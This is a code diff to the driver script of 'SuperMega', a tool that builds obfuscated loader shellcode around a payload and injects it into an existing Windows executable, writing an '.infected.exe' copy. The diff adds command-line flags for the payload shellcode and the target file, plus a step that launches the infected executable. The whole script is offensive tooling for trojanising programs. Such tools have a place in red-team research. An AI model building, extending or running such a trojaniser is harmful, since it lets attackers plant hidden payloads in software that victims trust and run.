@@ -1,6 +1,7 @@
 import shutil
 from enum import Enum
 from helper import *
+import argparse
 
 
 class AllocStyle(Enum):
@@ -32,6 +33,7 @@ options_default = {
 
     "try_start_loader_shellcode": False,  # without payload (Debugging)
     "try_start_final_shellcode": True,    # with payload (should work)
+    "try_start_final_infected_exe": True, # with payload (should work)
 
     # cleanup
     "cleanup_files_on_start": True,
@@ -84,15 +86,12 @@ options_verify = {
     "test_obfuscated_shc": False,
 }
 
-
-options = options_verify
-
+options = None
 
 main_c_file = os.path.join(build_dir, "main.c")
 main_asm_file = os.path.join(build_dir, "main.asm")
 main_exe_file = os.path.join(build_dir, "main.exe")
 main_shc_file = os.path.join(build_dir, "main.bin")
-
 
 debug_data = {
     "loader_shellcode": b"",
@@ -110,6 +109,30 @@ debug_data = {
 
 def main():
     print("Super Mega")
+
+    parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
+    parser.add_argument('--shellcode', type=str, help='The path to the file of your payload shellcode')
+    parser.add_argument('--inject', type=str, help='The path to the file where we will inject ourselves in')
+    parser.add_argument('--verify', action='store_true', help='Debug: Perform verification')
+    args = parser.parse_args()
+
+    if args.verify:
+        options = options_verify
+    else:
+        options = options_default
+        if args.shellcode:
+            if not os.path.isfile(args.shellcode):
+                print("Could not find: {}".format(args.shellcode))
+                return
+            options["payload"] = args.shellcode
+        if args.inject:
+            if not os.path.isfile(args.inject):
+                print("Could not find: {}".format(args.inject))
+                return
+            options["inject_exe"] = True
+            options["inject_exe_in"] = args.inject
+            options["inject_exe_out"] = args.inject.replace(".exe", ".infected.exe")
+
 
     if options["cleanup_files_on_start"]:
         clean_files()
@@ -179,19 +202,16 @@ def main():
             if verify_injected_exe(options["inject_exe_out"]):
                 debug_data["infected_exe"] = file_readall_binary(options["inject_exe_out"])
 
+        if options["try_start_final_infected_exe"]:
+            print("--[ Start infected exe ]")
+            subprocess.run([
+                options["inject_exe_out"],
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
     if options["cleanup_files_on_exit"]:
         clean_files()
 
-    print("{} {} {} - {} {} {} - {} {}".format(
-        len(debug_data["loader_shellcode"]),
-        len(debug_data["payload_shellcode"]),
-        len(debug_data["final_shellcode"]),
-        len(debug_data["asm_initial"]),
-        len(debug_data["asm_cleanup"]),
-        len(debug_data["asm_fixup"]),
-        len(debug_data["original_exe"]),
-        len(debug_data["infected_exe"]),
-    ))
 
 if __name__ == "__main__":
     main()
+
